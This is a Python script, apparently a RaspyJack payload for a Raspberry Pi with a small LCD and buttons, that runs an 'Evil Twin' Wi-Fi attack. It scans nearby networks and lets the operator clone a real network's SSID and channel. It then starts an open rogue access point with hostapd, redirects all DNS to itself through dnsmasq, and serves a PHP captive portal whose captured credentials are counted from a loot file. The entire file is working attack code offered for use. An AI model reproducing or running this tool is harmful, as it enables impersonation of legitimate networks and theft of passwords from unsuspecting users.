#!/usr/bin/env python3
import sys
import os
import time
import signal
import subprocess
import threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
from wifi.raspyjack_integration import (
    get_best_interface,
    set_raspyjack_interface
)
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

PINS: dict[str, int] = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13,
    "KEY1": 21, "KEY2": 20, "KEY3": 16,
}

GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_UI = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 10)

RASPYJACK_DIR = os.path.abspath(os.path.join(__file__, '..', '..'))
WIFI_INTERFACE = get_best_interface(prefer_wifi=True)
FAKE_AP_SSID = "Free_WiFi"
FAKE_AP_CHANNEL = "6"
CAPTIVE_PORTAL_BASE_PATH = os.path.join(RASPYJACK_DIR, "DNSSpoof", "sites")
CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, "wifi")
LOOT_FILE = os.path.join(CAPTIVE_PORTAL_PATH, "ip.txt")
TEMP_CONF_DIR = "/tmp/raspyjack_eviltwin/"

running = True
attack_processes = {}
status_info = {
    "clients": 0,
    "credentials": 0
}
ORIGINAL_WIFI_INTERFACE = None

current_html_file = "wifi"
html_files_list = []
html_file_index = 0

scanned_networks = []
selected_network_index = 0

def cleanup(*_):
    global running
    if running:
        running = False
        stop_attack()

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_message(message: str, color: str = "yellow"):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    bbox = d.textbbox((0, 0), message, font=FONT_TITLE)
    w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
    x = (WIDTH - w) // 2
    y = (HEIGHT - h) // 2
    d.text((x, y), message, font=FONT_TITLE, fill=color)
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui(screen_state="main", status: str = ""):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)

    if screen_state == "main":
        d.text((5, 5), "Evil Twin Attack", font=FONT_TITLE, fill="#00FF00")
        d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

        d.text((5, 30), f"SSID: {FAKE_AP_SSID}", font=FONT_UI, fill="white")
        d.text((5, 45), f"Channel: {FAKE_AP_CHANNEL}", font=FONT_UI, fill="white")
        d.text((5, 60), f"Portal: {current_html_file}", font=FONT_UI, fill="white")

        d.text((5, 80), "KEY1=Scan Networks", font=FONT_UI, fill="cyan")
        d.text((5, 95), "OK=Start", font=FONT_UI, fill="cyan")
        d.text((5, 110), "KEY3=Select Portal", font=FONT_UI, fill="cyan")
    elif screen_state == "html_select":
        d.text((5, 5), "Select Portal", font=FONT_TITLE, fill="yellow")
        d.line([(0, 22), (128, 22)], fill="yellow", width=1)

        if not html_files_list:
            d.text((5, 40), "No HTML files found!", font=FONT_UI, fill="red")
        else:
            for i, file_name in enumerate(html_files_list):
                display_name = file_name
                if len(display_name) > 16:
                    display_name = display_name[:13] + "..."
                
                text_color = "white"
                if i == html_file_index:
                    text_color = "lime"
                    d.rectangle([(0, 25 + i*15), (128, 25 + (i+1)*15)], fill="blue")
                d.text((5, 25 + i*15), display_name, font=FONT_UI, fill=text_color)
        d.text((5, 110), "UP/DOWN=Select | OK=Confirm", font=FONT_UI, fill="cyan")
    elif screen_state == "scan_networks":
        d.text((5, 5), "Scanning Networks...", font=FONT_TITLE, fill="yellow")
        d.line([(0, 22), (128, 22)], fill="yellow", width=1)

        if not scanned_networks:
            d.text((5, 40), "No networks found!", font=FONT_UI, fill="red")
        else:
            for i, network in enumerate(scanned_networks):
                display_name = network['ssid']
                if len(display_name) > 16:
                    display_name = display_name[:13] + "..."
                
                text_color = "white"
                if i == selected_network_index:
                    text_color = "lime"
                    d.rectangle([(0, 25 + i*15), (128, 25 + (i+1)*15)], fill="blue")
                d.text((5, 25 + i*15), display_name, font=FONT_UI, fill=text_color)
        d.text((5, 110), "UP/DOWN=Select | OK=Confirm", font=FONT_UI, fill="cyan")
    elif screen_state == "attacking":
        status_color = "lime" if status == "ACTIVE" else "red"
        d.text((30, 25), status, font=FONT_TITLE, fill=status_color)

        d.text((5, 45), f"SSID: {FAKE_AP_SSID}", font=FONT_UI, fill="white")
        d.text((5, 60), f"Clients: {status_info['clients']}", font=FONT_UI, fill="yellow")
        d.text((5, 75), f"Creds: {status_info['credentials']}", font=FONT_UI, fill="orange")

        d.text((5, 110), "OK=Stop | KEY3=Exit", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def scan_wifi_networks():
    global scanned_networks, selected_network_index, WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE

    draw_message("Scanning...", "yellow")
    
    ORIGINAL_WIFI_INTERFACE = WIFI_INTERFACE
    
    subprocess.run(f"nmcli device disconnect {WIFI_INTERFACE} 2>/dev/null || true", shell=True)
    subprocess.run(f"nmcli device set {WIFI_INTERFACE} managed off 2>/dev/null || true", shell=True)
    time.sleep(1)
    
    subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
    subprocess.run(f"iwconfig {WIFI_INTERFACE} mode monitor", shell=True)
    subprocess.run(f"ifconfig {WIFI_INTERFACE} up", shell=True)
    time.sleep(1)

    try:
        cmd = f"iwlist {WIFI_INTERFACE} scan"
        scan_output = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.PIPE)
        
        networks = []
        current_network = {}
        for line in scan_output.splitlines():
            line = line.strip()
            if line.startswith("Cell"):
                if current_network:
                    networks.append(current_network)
                current_network = {}
            elif line.startswith("ESSID:"):
                current_network['ssid'] = line.split(':', 1)[1].strip().strip('"')
            elif line.startswith("Address:"):
                current_network['bssid'] = line.split(':', 1)[1].strip()
            elif line.startswith("Channel:"):
                current_network['channel'] = line.split(':', 1)[1].strip()
        if current_network:
            networks.append(current_network)
        
        scanned_networks = [n for n in networks if 'ssid' in n and n['ssid']]
        selected_network_index = 0
        
    except subprocess.CalledProcessError as e:
        draw_message(f"Scan Error:\n{e.stderr.strip()}", "red")
        time.sleep(3)
        scanned_networks = []
    finally:
        subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
        subprocess.run(f"iwconfig {WIFI_INTERFACE} mode managed", shell=True)
        subprocess.run(f"ifconfig {WIFI_INTERFACE} up", shell=True)
        time.sleep(1)
        
        if ORIGINAL_WIFI_INTERFACE:
            subprocess.run(f"nmcli device set {ORIGINAL_WIFI_INTERFACE} managed yes 2>/dev/null || true", shell=True)
            subprocess.run(f"nmcli device connect {ORIGINAL_WIFI_INTERFACE} 2>/dev/null || true", shell=True)
            time.sleep(5)
            
            subprocess.run("systemctl restart NetworkManager 2>/dev/null || true", shell=True)
            time.sleep(5)
            
            WIFI_INTERFACE = ORIGINAL_WIFI_INTERFACE

def handle_file_selection_logic():
    global html_files_list, html_file_index, current_html_file, CAPTIVE_PORTAL_PATH, LOOT_FILE

    html_files_list = [d for d in os.listdir(CAPTIVE_PORTAL_BASE_PATH) if os.path.isdir(os.path.join(CAPTIVE_PORTAL_BASE_PATH, d))]
    html_files_list.sort()

    if not html_files_list:
        draw_message("No portals found!", "red")
        time.sleep(2)
        return

    try:
        html_file_index = html_files_list.index(current_html_file)
    except ValueError:
        html_file_index = 0
        current_html_file = html_files_list[0]

    while running:
        draw_ui("html_select")
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "UP":
            html_file_index = (html_file_index - 1 + len(html_files_list)) % len(html_files_list)
            current_html_file = html_files_list[html_file_index]
        elif btn == "DOWN":
            html_file_index = (html_file_index + 1) % len(html_files_list)
            current_html_file = html_files_list[html_file_index]
        elif btn == "OK":
            CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, current_html_file)
            LOOT_FILE = os.path.join(CAPTIVE_PORTAL_PATH, "loot.txt")
            draw_message(f"Selected:\n{current_html_file}", "lime")
            time.sleep(1)
            return
        elif btn == "KEY3":
            return
        
        time.sleep(0.1)

def check_dependencies():
    deps = ["hostapd", "dnsmasq", "php"]
    for dep in deps:
        if subprocess.run(f"which {dep}", shell=True, capture_output=True).returncode != 0:
            return dep
    return None

def stop_interfering_services():
    subprocess.run("pkill dnsmasq", shell=True)
    subprocess.run("pkill hostapd", shell=True)
    subprocess.run("pkill php", shell=True)
    time.sleep(2)

def create_configs():
    os.makedirs(TEMP_CONF_DIR, exist_ok=True)
    
    hostapd_conf_path = os.path.join(TEMP_CONF_DIR, "hostapd.conf")
    hostapd_conf = f"""
interface={WIFI_INTERFACE}
driver=nl80211
ssid={FAKE_AP_SSID}
hw_mode=g
channel={FAKE_AP_CHANNEL}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    with open(hostapd_conf_path, "w") as f:
        f.write(hostapd_conf)

    dnsmasq_conf_path = os.path.join(TEMP_CONF_DIR, "dnsmasq.conf")
    dnsmasq_conf = f"""
interface={WIFI_INTERFACE}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
address=/#/10.0.0.1
"""
    with open(dnsmasq_conf_path, "w") as f:
        f.write(dnsmasq_conf)
    
    return hostapd_conf_path, dnsmasq_conf_path

def start_attack():
    global attack_processes, ORIGINAL_WIFI_INTERFACE
    
    ORIGINAL_WIFI_INTERFACE = WIFI_INTERFACE
    
    draw_message(f"Activating {WIFI_INTERFACE}...", "yellow")
    if not set_raspyjack_interface(WIFI_INTERFACE):
        draw_message(f"Failed to activate {WIFI_INTERFACE}", "red")
        time.sleep(3)
        return False
    
    draw_message("Unmanaging NM...", "yellow")
    subprocess.run(f"nmcli device disconnect {WIFI_INTERFACE} 2>/dev/null || true", shell=True)
    subprocess.run(f"nmcli device set {WIFI_INTERFACE} managed off 2>/dev/null || true", shell=True)
    time.sleep(1)
    
    stop_interfering_services()
    hostapd_conf, dnsmasq_conf = create_configs()

    if os.path.exists(LOOT_FILE):
        os.remove(LOOT_FILE)

    try:
        subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True, check=True)
        subprocess.run(f"iwconfig {WIFI_INTERFACE} mode master", shell=True, check=True)
        subprocess.run(f"ifconfig {WIFI_INTERFACE} up 10.0.0.1 netmask 255.255.255.0", shell=True, check=True)
        
        cmd_hostapd = f"hostapd {hostapd_conf}"
        attack_processes['hostapd'] = subprocess.Popen(cmd_hostapd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
        time.sleep(2)
        if attack_processes['hostapd'].poll() is not None:
            print(f"ERROR: hostapd failed to start. Stderr: {attack_processes['hostapd'].stderr.read().decode()}", file=sys.stderr)
            return False

        cmd_dnsmasq = f"dnsmasq -C {dnsmasq_conf} -d"
        attack_processes['dnsmasq'] = subprocess.Popen(cmd_dnsmasq, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
        time.sleep(2)
        if attack_processes['dnsmasq'].poll() is not None:
            print(f"ERROR: dnsmasq failed to start. Stderr: {attack_processes['dnsmasq'].stderr.read().decode()}", file=sys.stderr)
            return False

        cmd_php = f"php -S 10.0.0.1:80 -t {CAPTIVE_PORTAL_PATH}"
        attack_processes['php'] = subprocess.Popen(cmd_php, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
        time.sleep(2)
        if attack_processes['php'].poll() is not None:
            print(f"ERROR: PHP web server failed to start. Stderr: {attack_processes['php'].stderr.read().decode()}", file=sys.stderr)
            return False
        
        return True
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"Error starting attack services: {e}", file=sys.stderr)
        return False

def stop_attack():
    global WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE
    for name, proc in attack_processes.items():
        try:
            os.kill(proc.pid, signal.SIGTERM)
        except ProcessLookupError:
            pass
    attack_processes.clear()
    
    stop_interfering_services()
    
    if ORIGINAL_WIFI_INTERFACE:
        draw_message("Restoring NM...", "yellow")
        subprocess.run(f"ifconfig {WIFI_INTERFACE} down 2>/dev/null || true", shell=True)
        subprocess.run(f"iwconfig {WIFI_INTERFACE} mode managed 2>/dev/null || true", shell=True)
        subprocess.run(f"ifconfig {WIFI_INTERFACE} up 2>/dev/null || true", shell=True)
        time.sleep(1)
        
        subprocess.run(f"nmcli device set {ORIGINAL_WIFI_INTERFACE} managed yes 2>/dev/null || true", shell=True)
        time.sleep(1)
        subprocess.run(f"nmcli device connect {ORIGINAL_WIFI_INTERFACE} 2>/dev/null || true", shell=True)
        time.sleep(5)
        
        subprocess.run("systemctl restart NetworkManager 2>/dev/null || true", shell=True)
        time.sleep(5)
        
        WIFI_INTERFACE = ORIGINAL_WIFI_INTERFACE
    
    if os.path.exists(TEMP_CONF_DIR):
        subprocess.run(f"rm -rf {TEMP_CONF_DIR}", shell=True)

def monitor_status():
    while running:
        try:
            with open("/var/lib/misc/dnsmasq.leases", "r") as f:
                status_info["clients"] = len(f.readlines())
        except FileNotFoundError:
            status_info["clients"] = 0
            
        try:
            with open(LOOT_FILE, "r") as f:
                status_info["credentials"] = len(f.readlines())
        except FileNotFoundError:
            status_info["credentials"] = 0
            
        time.sleep(5)

if __name__ == "__main__":
    try:
        is_attacking = False
        current_screen = "main"

        dep_missing = check_dependencies()
        if dep_missing:
            draw_message(f"{dep_missing} not found!", "red")
            time.sleep(5)
            raise SystemExit(f"{dep_missing} not found")

        while running:
            if current_screen == "main":
                draw_ui("main")
                if GPIO.input(PINS["KEY1"]) == 0:
                    current_screen = "scan_networks"
                    scan_wifi_networks()
                    time.sleep(0.2)
                elif GPIO.input(PINS["KEY3"]) == 0:
                    current_screen = "html_select"
                    time.sleep(0.2)
                elif GPIO.input(PINS["OK"]) == 0:
                    draw_message("Starting...")
                    if start_attack():
                        is_attacking = True
                        current_screen = "attacking"
                        threading.Thread(target=monitor_status, daemon=True).start()
                    else:
                        draw_message("Attack FAILED", "red")
                        time.sleep(3)
                        current_screen = "main"
                    time.sleep(0.2)
            elif current_screen == "scan_networks":
                draw_ui("scan_networks")
                btn = None
                for name, pin in PINS.items():
                    if GPIO.input(pin) == 0:
                        btn = name
                        while GPIO.input(pin) == 0:
                            time.sleep(0.05)
                        break
                
                if btn == "UP":
                    selected_network_index = (selected_network_index - 1 + len(scanned_networks)) % len(scanned_networks)
                elif btn == "DOWN":
                    selected_network_index = (selected_network_index + 1) % len(scanned_networks)
                elif btn == "OK":
                    if scanned_networks:
                        selected_network = scanned_networks[selected_network_index]
                        FAKE_AP_SSID = selected_network['ssid']
                        FAKE_AP_CHANNEL = selected_network['channel']
                        draw_message(f"Selected:\n{FAKE_AP_SSID}", "lime")
                        time.sleep(1)
                    current_screen = "main"
                elif btn == "KEY3":
                    current_screen = "main"
                time.sleep(0.1)
            elif current_screen == "html_select":
                handle_file_selection_logic()
                current_screen = "main"
                time.sleep(0.2)
            elif current_screen == "attacking":
                draw_ui("attacking", "ACTIVE")
                if GPIO.input(PINS["OK"]) == 0:
                    draw_message("Stopping...")
                    cleanup()
                    is_attacking = False
                    current_screen = "main"
                    time.sleep(2)
                elif GPIO.input(PINS["KEY3"]) == 0:
                    cleanup()
                    break
            
            time.sleep(0.1)

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        draw_message(f"ERROR:\n{str(e)[:20]}", "red")
        time.sleep(3)
    finally:
        cleanup()
        draw_message("Cleaning up...")
        time.sleep(2)
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Evil Twin payload finished.")